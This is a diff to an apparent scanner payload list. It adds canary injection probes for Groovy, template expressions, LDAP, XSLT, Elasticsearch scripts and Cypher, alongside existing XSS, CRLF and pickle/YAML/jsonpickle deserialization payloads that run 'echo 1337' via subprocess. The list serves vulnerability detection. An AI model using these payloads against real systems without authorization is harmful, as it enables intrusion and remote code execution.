@@ -116,6 +116,8 @@ Integer("1337")
 (1337).to_s.to_i
 7331-5994
 (function(){return 7*191})()
+new GroovyShell().evaluate('7*191')
+"${7*191}"
 "'`><script>alert(1337)</script>
 "'`><img src=x onerror=alert(1337)>
 "'`><svg/onload=alert(1337)>
@@ -156,6 +158,28 @@ ${7*191}${7*191}
 %0dInjected:1337
 1337%0d%0aInjected:true
 1337%00%0d%0aInjected:true
+*)(uid=1337)(&(objectClass=*
+1337)(|(objectClass=*
+*)(cn=1337)(|
+*)(|(uid=1337)(objectClass=*
+*)(description=1337)(&(cn=*
+*)(uid=1337)(cn=*
+<xsl:value-of select="7*191"/>
+<xsl:value-of select="1337"/>
+<xsl:value-of select="string(7*191)"/>
+<xsl:value-of select="2674 div 2"/>
+<xsl:value-of select="1338 - 1"/>
+<?xml version="1.0"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/"><result><xsl:value-of select="7*191"/></result></xsl:template></xsl:stylesheet>
+{"script_fields":{"x":{"script":"7*191"}}}
+{"script_fields":{"x":{"script":{"source":"return 7*191"}}}}
+{"query":{"script":{"script":{"source":"doc['id'].value == 7*191"}}}}
+{"aggs":{"x":{"sum":{"script":"7*191"}}}}
+{"aggs":{"x":{"bucket_script":{"buckets_path":{},"script":"7*191"}}}}
+{"query":{"function_score":{"script_score":{"script":"7*191"}}}}
+' RETURN 7*191 AS x //
+') RETURN 7*191 AS x //
+' OR 1=1 RETURN 7*191 //
+') OR 1=1 RETURN toInteger(7*191) AS x //
 Y3N1YnByb2Nlc3MKY2hlY2tfb3V0cHV0CihTJ2VjaG8gMTMzNycKSTAxCnRSLg==
 !!python/object/apply:subprocess.check_output [["echo","1337"]]
 {"py/reduce":[{"py/function":"subprocess.check_output"},{"py/tuple":[["echo","1337"]]}]}
